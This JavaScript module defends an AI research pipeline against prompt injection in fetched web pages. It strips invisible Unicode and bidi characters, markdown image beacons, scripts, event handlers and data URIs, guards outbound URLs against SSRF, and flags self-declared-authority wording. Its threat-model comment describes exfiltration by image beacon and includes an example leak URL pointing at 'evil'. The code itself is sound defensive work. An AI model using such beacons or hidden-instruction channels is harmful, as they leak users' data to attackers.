// Hostile-source defense, deterministic half: the exfiltration scrub + the egress
// guard + the credibility-puffery lexicon. Gate-5 design (the analyst design notes
// Everything here is pure string/URL processing: no LLM, no network.
//
// The threat model: fetched page content is attacker-controllable. Before ANY model
// sees a passage, the deterministic scrub removes the channels an injection uses to
// exfiltrate or hide (image beacons, invisible codepoints, active content), and the
// egress guard ensures no stage can be steered into fetching an attacker-chosen URL.
// Exfiltration is the one attack class that can be closed near-deterministically;
// close it here.

// ---------- the scrub ----------
const SCRUBS = [
  // Unicode Tag characters (U+E0000-E007F): the invisible-instruction channel.
  { cls: 'unicode_tags', re: /[\u{E0000}-\u{E007F}]/gu },
  // zero-width + bidi controls: hidden text steering and spoofed rendering.
  { cls: 'invisible_controls', re: /[​-‏‪-‮⁠-⁤﻿]/g },
  // markdown image syntax: the classic zero-click beacon (![](https://evil/?leak=...)).
  { cls: 'markdown_image', re: /!\[[^\]]*\]\([^)]*\)|!\[[^\]]*\]\[[^\]]*\]/g },
  // active content and handlers.
  { cls: 'script_tag', re: /<script[\s\S]*?<\/script>/gi },
  { cls: 'event_handler', re: /\son\w+\s*=\s*["'][^"']*["']/gi },
  { cls: 'data_uri', re: /data:[a-z]+\/[a-z0-9.+-]+[;,][^\s"')]*/gi },
]

// stripDangerous(passage) -> { clean, stripped: [class names that fired] }
export function stripDangerous(passage) {
  let clean = String(passage ?? '')
  const stripped = []
  for (const s of SCRUBS) {
    if (s.re.test(clean)) {
      stripped.push(s.cls)
      clean = clean.replace(s.re, '')
    }
    s.re.lastIndex = 0
  }
  return { clean, stripped }
}

// ---------- the egress guard ----------
// Every fetch a stage makes goes through this check. No stage that reads untrusted
// content may reach an attacker-chosen destination: https or the internal scheme
// only, no localhost/link-local (SSRF), and an optional host allowlist for runs
// that declare their research surface up front.
export function urlGuard(url, { allowHosts } = {}) {
  let u
  try {
    u = new URL(url)
  } catch {
    return { ok: false, reason: 'unparseable URL' }
  }
  if (u.protocol === 'internal:') return { ok: true }
  if (u.protocol !== 'https:') return { ok: false, reason: `scheme ${u.protocol} blocked (https or internal only)` }
  const host = u.hostname.toLowerCase()
  if (host === 'localhost' || host.startsWith('127.') || host === '0.0.0.0' || host.endsWith('.local') || host.startsWith('169.254.') || host.startsWith('10.') || host.startsWith('192.168.')) {
    return { ok: false, reason: 'local/link-local destination blocked' }
  }
  if (Array.isArray(allowHosts) && allowHosts.length) {
    const allowed = allowHosts.some((h) => host === h || host.endsWith('.' + h))
    if (!allowed) return { ok: false, reason: `host ${host} not on the run allowlist` }
  }
  return { ok: true }
}

// ---------- credibility puffery ----------
// Self-declared authority is evidence of manipulation, never of credibility.
// A passage that argues for its own likelihood ratio gets that ratio CAPPED.
export const PUFFERY_LEXICON = [
  'definitive', 'proven beyond', 'authoritative', 'guaranteed', 'undeniable',
  'indisputable', 'treat as certain', 'cite this as certain', 'peer-reviewed and final',
  'this proves', 'certainly true', 'cannot be disputed',
]
export const PUFFERY_LR_CAP = 2.0

export function hasPuffery(passage) {
  const hay = String(passage ?? '').toLowerCase()
  const hits = PUFFERY_LEXICON.filter((w) => hay.includes(w))
  return { flagged: hits.length > 0, hits }
}
